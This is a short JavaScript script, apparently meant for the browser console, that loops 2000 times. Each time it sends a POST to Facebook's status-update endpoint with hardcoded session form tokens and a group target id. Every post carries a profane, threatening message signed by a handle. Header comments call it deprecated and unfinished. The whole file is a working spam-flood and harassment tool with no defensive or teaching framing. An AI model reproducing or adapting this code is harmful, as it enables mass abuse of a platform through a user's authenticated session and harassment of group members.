///////// DEPRECATED AFTER FACEBOOK GROUPS ARCHIVE AS WELL AS TIMELINE MIGRATIONS /// DO NOT USE !!!


//UNFINISHED !!!! do not run !!

function spamhttpRequest(httpx)
{
	
	var turl, params, editurl, parlength;
	editurl = "\/ajax\/updatestatus.php";
	params = "post_form_id=b95f8c7f5db462dec69c5140fbdd0388&fb_dtsg=kfpnF&xhpc_composerid=u771380_3&xhpc_targetid=147604968628864&xhpc_context=profile&xhpc_fbx=&xhpc_message_text=this%20is%20just%20the%20begining%2C%20you're%20fucking%20with%20the%20wrong%20nerd%20mothafucka-Withlove-SheepBlack.k&xhpc_message=this%20is%20just%20the%20start%2C%20you're%20fucking%20with%20the%20wrong%20nerd%20mothafucka-Withlove-SheepBlack.&nctr[_mod]=pagelet_group_composer&lsd&post_form_id_source=AsyncRequest";
	parlength = params.length+"\r\n";
	httpx.open("POST", editurl, true);
	httpx.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
	httpx.setRequestHeader("Referer", "http:\/\/www.facebook.com/home.php?sk=group_147604968628864");
	//httpx.setRequestHeader("Host", "upload.facebook.com");
	httpx.onreadystatechange = function()
	{
		if(httpx.readyState === 4 && httpx.status === 200) 
		{
		console.log("meshe l 7al");
		
		}
	};
	httpx.send(params);	
}
for(i = 0 ; i < 2000 ; i++){
var xhttp = new XMLHttpRequest();
spamhttpRequest(xhttp);
console.log("uploading: " + i);
}
